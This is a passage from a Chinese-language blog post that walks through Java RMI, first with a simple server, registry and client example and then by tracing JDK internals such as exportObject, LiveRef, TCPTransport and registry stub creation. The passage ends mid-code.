<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Amzf3">服务端</h3>
服务端需要去把这个接口实现，因为最后调用的是服务端的代码

<p><strong>RemoteObjlmpl</strong>这个类在定义的时候有要求，需要<strong>继承UnicastRemoteObject</strong>这个类（如果你想把这个绑定到RMI<font style="color:rgb(51, 51, 51);">Registry中，就需要去继承它</font>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjlmpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span>  <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjlmpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在服务端代码中，首先我们需要去创建一个远程对象来保证通信，但是客户端并不知道这个端口是多少，所以需要一个注册中心<code>RMIregistry</code>，它是有固定端口的，一般是1099，最后把注册中心绑定到远程对象上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjlmpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="moZIX">客户端</h3>
客户端获取注册中心（ip和端口都是固定的），从注册中心中查找remoteObj远程对象，然后去调用他的方法

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735189589676-11914c58-3e0d-4819-b17c-beab7148acfc.png"></p>
<p><strong>在这通信过程中，通过网络操作去实现一个内存操作，这里面有一个对象的创建和调用过程，这里面全是通过序列化和反序列化实现的</strong></p>
<h2 id="pV36o">源码层面分析</h2>
<h3 id="okKpD">创建远程服务</h3>
创建远程服务代码如下，我们动态调试来看一下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjlmpl</span>();</span><br></pre></td></tr></table></figure>

<p>首先会调用RemoteObjImpl的构造方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565514276-4c11398f-1929-4a82-b2bf-eaa899fbf245.png"></p>
<p>由于这个类继承于<code>UnicastRemoteObject</code>，使用会调用父类的无参构造</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565708214-b45272c2-f817-47a9-8a74-35857154a033.png"></p>
<p>在其父类的构造方法中，会将默认port设置为0（后续会随机设置一个端口）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>之后会有一系列的赋值，我们就不细看了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565940179-933b8f8f-c47b-44e5-a916-6f90a408c6ec.png"></p>
<p>在其构造方法中，会调用<code>exportObject</code>，它的名字就是”导出对象“，很明显是我们的核心函数</p>
<p>其中，它创建了一个<code>UnicastServerRef</code>，”服务端引用“，其中传入了一个端口，前面这个obj，很明显是我们用来实现逻辑的，而后面这个对象，就是我们用来处理网络请求的了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在UnicastServerRef的构造函数中，创建了一个<code>LiveRef</code>类（非常重要的一个类），将port传入其构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(port));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>（其中传入的一个ObjID我们就不多说了）其中<code>TCPEndpoint</code>的构造函数（一个IP，一个端口），很明显就是用来处理网络请求的</p>
<p>在<code>LiveRef</code>中，存着endpoint，objID与isLocal</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>((<span class="keyword">new</span> <span class="title class_">ObjID</span>()), port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID objID, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(objID, TCPEndpoint.getLocalEndpoint(port), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID objID, Endpoint endpoint, <span class="type">boolean</span> isLocal)</span> &#123;</span><br><span class="line">        ep = endpoint;</span><br><span class="line">        id = objID;</span><br><span class="line">        <span class="built_in">this</span>.isLocal = isLocal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TCPEndpoint</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TCPEndpoint</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(host, port, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中ep存入的东西如下（目前port为0），后面我们会说到，transport才是真正处理网络请求的东西，外面的每一层都是对它的封装</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735566671831-806caa47-7896-4881-9675-6181331c8b1f.png"></p>
<p>这样<code>LiveRef</code>就创建好了，然后会调用它父类的构造函数</p>
<p>在其父类的构造函数，也是简单赋了值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(port));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">        ref = liveRef;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>返回回去，我们进入<code>exportObject</code>方法，在sref中，封装着LiveRef</p>
<p>在这段中，就是一直在不同的类中调用<code>exportObject</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">            ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735567219818-51af68bc-1e60-4d7d-af0f-1eccc556f56e.png"></p>
<p>进入sref中的<code>exportObject</code>方法，在这里创建了代理stub</p>
<p>那么有人问了，我这里不是服务端吗，为什么会创建客户端的stub呢？</p>
<p>这里是因为，是服务端创建stub，将stub放在注册中心，客户端去注册中心拿到stub，然后用stub去操作skeleton</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                               <span class="type">boolean</span> permanent)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; implClass = impl.getClass();</span><br><span class="line">        Remote stub;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">                <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            setSkeleton(impl);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">        ref.exportObject(target);</span><br><span class="line">        hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line">        <span class="keyword">return</span> stub;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看看createProxy中的逻辑,其中implClass中放的是远程对象的类，clientRef中放着LiveRef</p>
<p>其中有一个判断，forceStubUse和ignoreStubClasses咱们暂时不解释它，看一下stubClassExists中的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                     RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                     <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; remoteClass;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">            !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568100492-4a264e10-6dcd-456e-a822-2ee1a55cb777.png"></p>
<p>它判断，如果存在	远程类的名字+ “_Stub”	这个类，他就会走进去</p>
<p>实际上JDK中有一些类是已经定义好的（现在我们先过，后面会说）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568394438-93713b2f-ad56-4283-a1a4-a770781f8d0e.png"></p>
<p>还是在这个类中，接下来就会创建动态代理，经过些，动态代理就已经创建好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                       interfaces,</span><br><span class="line">                                                       handler);</span><br><span class="line">            &#125;&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>tip:在创建代理过程中的几个参数如下</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568717699-3035db44-e998-4adb-8ccc-9b0b0816a485.png"></p>
<p>若上述过程中，存在这么一个系统内置的stub类，就会进入下面的if当中（后续讨论）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            setSkeleton(impl);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>创建完成后，会将当前有用的信息封装进入，就是一个总封装（其中封装的信息如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735569232927-dca9e42f-96e1-4645-91a6-926be85cbf90.png"></p>
<p>接下来就把我们封装的东西发布出去（使用exportObject函数），我们进入看一下它的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ref.exportObject(target);</span><br></pre></td></tr></table></figure>

<p>这里会层层调用exportObject函数，最终走到了TCPTransport的exportObject，这里是最终处理网络请求的地方，在TCPTransport#exportObject会调用listen函数，这里就会开放端口，我们跟进去看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LiveRef#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        ep.exportObject(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TCPEndpoint#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        transport.exportObject(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TCPTransport#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Ensure that a server socket is listening, and count this</span></span><br><span class="line"><span class="comment">         * export while synchronized to prevent the server socket from</span></span><br><span class="line"><span class="comment">         * being closed due to concurrent unexports.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            listen();</span><br><span class="line">            exportCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Try to add the Target to the exported object table; keep</span></span><br><span class="line"><span class="comment">         * counting this export (to keep server socket open) only if</span></span><br><span class="line"><span class="comment">         * that succeeds.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.exportObject(target);</span><br><span class="line">            ok = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                    decrementExportCount();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>server = ep.newServerSocket();</code>构造了一个socket，创建一个线程后打开线程，等待别人来连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TCPTransport#listen</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">assert</span> Thread.holdsLock(<span class="built_in">this</span>);</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> getEndpoint();</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> ep.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (server == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                tcpLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;(port &quot;</span> + port + <span class="string">&quot;) create server socket&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                server = ep.newServerSocket();</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Don&#x27;t retry ServerSocket if creation fails since</span></span><br><span class="line"><span class="comment">                 * &quot;port in use&quot; will cause export to hang if an</span></span><br><span class="line"><span class="comment">                 * RMIFailureHandler is not installed.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">AcceptLoop</span>(server),</span><br><span class="line">                                        <span class="string">&quot;TCP Accept-&quot;</span> + port, <span class="literal">true</span>));</span><br><span class="line">                t.start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.net.BindException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Port already in use: &quot;</span> + port, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Listen failed on port: &quot;</span> + port, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// otherwise verify security access to existing server socket</span></span><br><span class="line">            <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">                sm.checkListen(port);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在构造socket的过程中，如果说端口是0的话，就会随机设置一个端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (listenPort == <span class="number">0</span>)</span><br><span class="line">            setDefaultPort(server.getLocalPort(), csf, ssf);</span><br></pre></td></tr></table></figure>

<p>最后经过一系列返回，最后ObjectTable中，使用putTarget将target保存在了一个静态表objTable中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">objTable.put(oe, target);</span><br><span class="line">implTable.put(weakImpl, target);</span><br></pre></td></tr></table></figure>

<p>创建服务端的代码就走完了，最后等待连接</p>
<h3 id="ePUrT">创建注册中心+绑定</h3>
<h4 id="pWH6N">创建注册中心</h4>
**tip：表面上注册中心和远程服务是不一样的东西，但是实际上是一样的东西**

<p>创建注册中心代码如下，我们将1099默认端口传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>走进<code>createRegistry</code>方法中，该方法会创建<code>RegistryImpl</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(port);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看一下它的构造方法，首先开头的if判断是一个安全验证的东西，我们暂时不看，在下方else中，会创建<code>LiveRef</code>对象和<code>UnicastServerRef</code>对象，<code>UnicastServerRef</code>中放入<code>LiveRef</code>（和我们之看的创建远程服务很是类似）最后调用了一个<code>setup</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">            setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看看再setup方法中干了些什么</p>
<p>与注册远程服务时<code>UnicastRemoteObject#exportObject</code>相比，只有第三个参数由false变为了ture</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(UnicastServerRef uref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Server ref must be created and assigned before remote</span></span><br><span class="line"><span class="comment">         * object &#x27;this&#x27; can be exported.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        ref = uref;</span><br><span class="line">        uref.exportObject(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnicastRemoteObject#exportObject</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">            ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>boolean permanent</code>为第三个参数，意为永久性，所以说我们现在创建的注册中心是一个永久性的对象，而之前说的远程服务是一个临时性的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                               <span class="type">boolean</span> permanent)</span></span><br></pre></td></tr></table></figure>

<p>接下来我们应该可以回顾起来之前的知识</p>
<p>下面我把有区别的地方拿出来,再最后调用的<code>stubClassExists</code>中的if判断时候，最终会找到<code>RegistryImpl_Stub</code>类，所以会走到try中的函数并返回true</p>
<p>在<code>createProxy</code>的if判断中返回true后，会走到if中，执行<code>createStub</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UnicastServerRef#exportObject</span></span><br><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                               <span class="type">boolean</span> permanent)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">                <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Util#createProxy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                     RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                     <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">            !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> 